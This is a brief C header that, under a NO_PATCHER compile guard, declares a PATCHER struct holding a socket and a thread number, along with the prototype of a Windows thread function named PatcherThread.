#ifndef NO_PATCHER

typedef struct PATCHER {
	SOCKET	Sock;
	int		tnum;
} PATCHER;

DWORD WINAPI PatcherThread(LPVOID param);

#endif